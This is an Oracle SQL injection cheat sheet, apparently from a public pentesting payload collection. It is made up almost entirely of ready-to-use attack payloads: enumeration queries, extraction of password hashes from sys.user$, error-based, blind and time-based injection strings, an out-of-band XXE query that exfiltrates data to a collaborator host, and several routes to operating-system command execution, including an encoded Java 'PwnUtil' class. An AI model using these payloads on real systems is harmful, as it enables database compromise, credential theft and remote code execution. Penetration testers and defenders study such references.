# Oracle SQL Injection

> Oracle SQL Injection  is a type of security vulnerability that arises when attackers can insert or "inject" malicious SQL code into SQL queries executed by Oracle Database. This can occur when user inputs are not properly sanitized or parameterized, allowing attackers to manipulate the query logic. This can lead to unauthorized access, data manipulation, and other severe security implications.


## Summary

* [Oracle SQL Default Databases](#oracle-sql-default-databases)
* [Oracle SQL Comments](#oracle-sql-comments)
* [Oracle SQL Enumeration](#oracle-sql-enumeration)
* [Oracle SQL Database Credentials](#oracle-sql-database-credentials)
* [Oracle SQL Methodology](#oracle-sql-methodology)
    * [Oracle SQL List Databases](#oracle-sql-list-databases)
    * [Oracle SQL List Tables](#oracle-sql-list-tables)
    * [Oracle SQL List Columns](#oracle-sql-list-columns)
* [Oracle SQL Error Based](#oracle-sql-error-based)
* [Oracle SQL Blind](#oracle-sql-blind)
    * [Oracle Blind With Substring Equivalent](#oracle-blind-with-substring-equivalent)
* [Oracle SQL Time Based](#oracle-sql-time-based)
* [Oracle SQL Out of Band](#oracle-sql-out-of-band)
* [Oracle SQL Command Execution](#oracle-sql-command-execution)
    * [Oracle Java Execution](#oracle-java-execution)
    * [Oracle Java Class](#oracle-java-class)
* [OracleSQL File Manipulation](#OracleSQL-file-manipulation)
    * [OracleSQL Read File](#OracleSQL-read-file)
    * [OracleSQL Write File](#OracleSQL-write-file)
    * [Package os_command](#package-os_command)
    * [DBMS_SCHEDULER Jobs](#dbms_scheduler-jobs)
* [References](#references)


## Oracle SQL Default Databases

| Name               | Description               |
|--------------------|---------------------------|
| SYSTEM             | Available in all versions |
| SYSAUX             | Available in all versions |


## Oracle SQL Comments

| Type                | Comment |
| ------------------- | ------- |
| Single-Line Comment | `--`    |
| Multi-Line Comment  | `/**/`  |


## Oracle SQL Enumeration

| Description   | SQL Query |
| ------------- | ------------------------------------------------------------ |
| DBMS version  | `SELECT user FROM dual UNION SELECT * FROM v$version`        |
| DBMS version  | `SELECT banner FROM v$version WHERE banner LIKE 'Oracle%';`  |
| DBMS version  | `SELECT banner FROM v$version WHERE banner LIKE 'TNS%';`     |
| DBMS version  | `SELECT BANNER FROM gv$version WHERE ROWNUM = 1;`            |
| DBMS version  | `SELECT version FROM v$instance;`                            |
| Hostname      | `SELECT UTL_INADDR.get_host_name FROM dual;`                 |
| Hostname      | `SELECT UTL_INADDR.get_host_name('10.0.0.1') FROM dual;`     |
| Hostname      | `SELECT UTL_INADDR.get_host_address FROM dual;`              |
| Hostname      | `SELECT host_name FROM v$instance;`                          |
| Database name | `SELECT global_name FROM global_name;`                       |
| Database name | `SELECT name FROM V$DATABASE;`                               |
| Database name | `SELECT instance_name FROM V$INSTANCE;`                      |
| Database name | `SELECT SYS.DATABASE_NAME FROM DUAL;`                        |
| Database name | `SELECT sys_context('USERENV', 'CURRENT_SCHEMA') FROM dual;` |


## Oracle SQL Database Credentials

| Query                                   | Description               |
|-----------------------------------------|---------------------------|
| `SELECT username FROM all_users;`       | Available on all versions |
| `SELECT name, password from sys.user$;` | Privileged, <= 10g        |
| `SELECT name, spare4 from sys.user$;`   | Privileged, <= 11g        |


## Oracle SQL Methodology

### Oracle SQL List Databases

```sql
SELECT DISTINCT owner FROM all_tables;
SELECT OWNER FROM (SELECT DISTINCT(OWNER) FROM SYS.ALL_TABLES)
```

### Oracle SQL List Tables

```sql
SELECT table_name FROM all_tables;
SELECT owner, table_name FROM all_tables;
SELECT owner, table_name FROM all_tab_columns WHERE column_name LIKE '%PASS%';
SELECT OWNER,TABLE_NAME FROM SYS.ALL_TABLES WHERE OWNER='<DBNAME>'
```

### Oracle SQL List Columns

```sql
SELECT column_name FROM all_tab_columns WHERE table_name = 'blah';
SELECT COLUMN_NAME,DATA_TYPE FROM SYS.ALL_TAB_COLUMNS WHERE TABLE_NAME='<TABLE_NAME>' AND OWNER='<DBNAME>'
```


## Oracle SQL Error Based

| Description           | Query          |
| :-------------------- | :------------- |
| Invalid HTTP Request  | `SELECT utl_inaddr.get_host_name((select banner from v$version where rownum=1)) FROM dual` |
| CTXSYS.DRITHSX.SN     | `SELECT CTXSYS.DRITHSX.SN(user,(select banner from v$version where rownum=1)) FROM dual` |
| Invalid XPath         | `SELECT ordsys.ord_dicom.getmappingxpath((select banner from v$version where rownum=1),user,user) FROM dual` |
| Invalid XML           | `SELECT to_char(dbms_xmlgen.getxml('select "'&#124;&#124;(select user from sys.dual)&#124;&#124;'" FROM sys.dual')) FROM dual` |
| Invalid XML           | `SELECT rtrim(extract(xmlagg(xmlelement("s", username &#124;&#124; ',')),'/s').getstringval(),',') FROM all_users` |
| SQL Error             | `SELECT NVL(CAST(LENGTH(USERNAME) AS VARCHAR(4000)),CHR(32)) FROM (SELECT USERNAME,ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=1))` |
| XDBURITYPE getblob    | `XDBURITYPE((SELECT banner FROM v$version WHERE banner LIKE 'Oracle%')).getblob()` |
| XDBURITYPE getclob    | `XDBURITYPE((SELECT table_name FROM (SELECT ROWNUM r,table_name FROM all_tables ORDER BY table_name) WHERE r=1)).getclob()` |
| XMLType               | `AND 1337=(SELECT UPPER(XMLType(CHR(60)\|\|CHR(58)\|\|'~'\|\|(REPLACE(REPLACE(REPLACE(REPLACE((SELECT banner FROM v$version),' ','_'),'$','(DOLLAR)'),'@','(AT)'),'#','(HASH)'))\|\|'~'\|\|CHR(62))) FROM DUAL) -- -` |
| DBMS_UTILITY          | `AND 1337=DBMS_UTILITY.SQLID_TO_SQLHASH('~'\|\|(SELECT banner FROM v$version)\|\|'~') -- -` |

When the injection point is inside a string use : `'||PAYLOAD--`


## Oracle SQL Blind

| Description              | Query          |
| :----------------------- | :------------- |
| Version is 12.2	       | `SELECT COUNT(*) FROM v$version WHERE banner LIKE 'Oracle%12.2%';` |
| Subselect is enabled	   | `SELECT 1 FROM dual WHERE 1=(SELECT 1 FROM dual)` |
| Table log_table exists   | `SELECT 1 FROM dual WHERE 1=(SELECT 1 from log_table);` |
| Column message exists in table log_table | `SELECT COUNT(*) FROM user_tab_cols WHERE column_name = 'MESSAGE' AND table_name = 'LOG_TABLE';` |
| First letter of first message is t | `SELECT message FROM log_table WHERE rownum=1 AND message LIKE 't%';` |


### Oracle Blind With Substring Equivalent

| Function    | Example                                   |
| ----------- | ----------------------------------------- | 
| `SUBSTR`    | `SUBSTR('foobar', <START>, <LENGTH>)`     | 


## Oracle SQL Time Based

```sql
AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME]) 
AND 1337=(CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('RANDSTR',10) ELSE 1337 END)
```


## Oracle SQL Out of Band

```sql
SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual
```


## Oracle SQL Command Execution

* [quentinhardy/odat](https://github.com/quentinhardy/odat) - ODAT (Oracle Database Attacking Tool)

### Oracle Java Execution

* List Java privileges

    ```sql
    select * from dba_java_policy
    select * from user_java_policy
    ```

* Grant privileges

    ```sql
    exec dbms_java.grant_permission('SCOTT', 'SYS:java.io.FilePermission','<<ALL FILES>>','execute');
    exec dbms_java.grant_permission('SCOTT','SYS:java.lang.RuntimePermission', 'writeFileDescriptor', '');
    exec dbms_java.grant_permission('SCOTT','SYS:java.lang.RuntimePermission', 'readFileDescriptor', '');
    ```

* Execute commands
    * 10g R2, 11g R1 and R2: `DBMS_JAVA_TEST.FUNCALL()`

        ```sql
        SELECT DBMS_JAVA_TEST.FUNCALL('oracle/aurora/util/Wrapper','main','c:\\windows\\system32\\cmd.exe','/c', 'dir >c:\test.txt') FROM DUAL
        SELECT DBMS_JAVA_TEST.FUNCALL('oracle/aurora/util/Wrapper','main','/bin/bash','-c','/bin/ls>/tmp/OUT2.LST') from dual
        ```

    * 11g R1 and R2: `DBMS_JAVA.RUNJAVA()`

        ```sql
        SELECT DBMS_JAVA.RUNJAVA('oracle/aurora/util/Wrapper /bin/bash -c /bin/ls>/tmp/OUT.LST') FROM DUAL
        ```


### Oracle Java Class

* Create Java class

    ```sql
    BEGIN
    EXECUTE IMMEDIATE 'create or replace and compile java source named "PwnUtil" as import java.io.*; public class PwnUtil{ public static String runCmd(String args){ try{ BufferedReader myReader = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(args).getInputStream()));String stemp, str = "";while ((stemp = myReader.readLine()) != null) str += stemp + "\n";myReader.close();return str;} catch (Exception e){ return e.toString();}} public static String readFile(String filename){ try{ BufferedReader myReader = new BufferedReader(new FileReader(filename));String stemp, str = "";while((stemp = myReader.readLine()) != null) str += stemp + "\n";myReader.close();return str;} catch (Exception e){ return e.toString();}}};';
    END;

    BEGIN
    EXECUTE IMMEDIATE 'create or replace function PwnUtilFunc(p_cmd in varchar2) return varchar2 as language java name ''PwnUtil.runCmd(java.lang.String) return String'';';
    END;

    -- hex encoded payload
    SELECT TO_CHAR(dbms_xmlquery.getxml('declare PRAGMA AUTONOMOUS_TRANSACTION; begin execute immediate utl_raw.cast_to_varchar2(hextoraw(''637265617465206f72207265706c61636520616e6420636f6d70696c65206a61766120736f75726365206e616d6564202270776e7574696c2220617320696d706f7274206a6176612e696f2e2a3b7075626c696320636c6173732070776e7574696c7b7075626c69632073746174696320537472696e672072756e28537472696e672061726773297b7472797b4275666665726564526561646572206d726561643d6e6577204275666665726564526561646572286e657720496e70757453747265616d5265616465722852756e74696d652e67657452756e74696d6528292e657865632861726773292e676574496e70757453747265616d282929293b20537472696e67207374656d702c207374723d22223b207768696c6528287374656d703d6d726561642e726561644c696e6528292920213d6e756c6c29207374722b3d7374656d702b225c6e223b206d726561642e636c6f736528293b2072657475726e207374723b7d636174636828457863657074696f6e2065297b72657475726e20652e746f537472696e6728293b7d7d7d''));
    EXECUTE IMMEDIATE utl_raw.cast_to_varchar2(hextoraw(''637265617465206f72207265706c6163652066756e6374696f6e2050776e5574696c46756e6328705f636d6420696e207661726368617232292072657475726e207661726368617232206173206c616e6775616765206a617661206e616d65202770776e7574696c2e72756e286a6176612e6c616e672e537472696e67292072657475726e20537472696e67273b'')); end;')) results FROM dual
    ```

* Run OS command

    ```sql
    SELECT PwnUtilFunc('ping -c 4 localhost') FROM dual;
    ``` 


### Package os_command

```sql
SELECT os_command.exec_clob('<COMMAND>') cmd from dual
```

### DBMS_SCHEDULER Jobs

```sql
DBMS_SCHEDULER.CREATE_JOB (job_name => 'exec', job_type => 'EXECUTABLE', job_action => '<COMMAND>', enabled => TRUE)
```


## OracleSQL File Manipulation

:warning: Only in a stacked query.

### OracleSQL Read File

```sql
utl_file.get_line(utl_file.fopen('/path/to/','file','R'), <buffer>)
```

### OracleSQL Write File

```sql
utl_file.put_line(utl_file.fopen('/path/to/','file','R'), <buffer>)
```



## References

- [ASDC12 - New and Improved Hacking Oracle From Web - Sumit “sid” Siddharth - November 8, 2021](https://web.archive.org/web/20211108150011/https://owasp.org/www-pdf-archive/ASDC12-New_and_Improved_Hacking_Oracle_From_Web.pdf)
- [Error Based Injection | NetSPI SQL Injection Wiki - NetSPI - February 15, 2021](https://sqlwiki.netspi.com/injectionTypes/errorBased/#oracle)
- [ODAT: Oracle Database Attacking Tool - quentinhardy - March 24, 2016](https://github.com/quentinhardy/odat/wiki/privesc)
- [Oracle SQL Injection Cheat Sheet - @pentestmonkey - August 30, 2011](http://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sheet)
- [Pentesting Oracle TNS Listener - HackTricks - July 19, 2024](https://book.hacktricks.xyz/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener)
- [The SQL Injection Knowledge Base - Roberto Salgado - May 29, 2013](https://www.websec.ca/kb/sql_injection#Oracle_Default_Databases)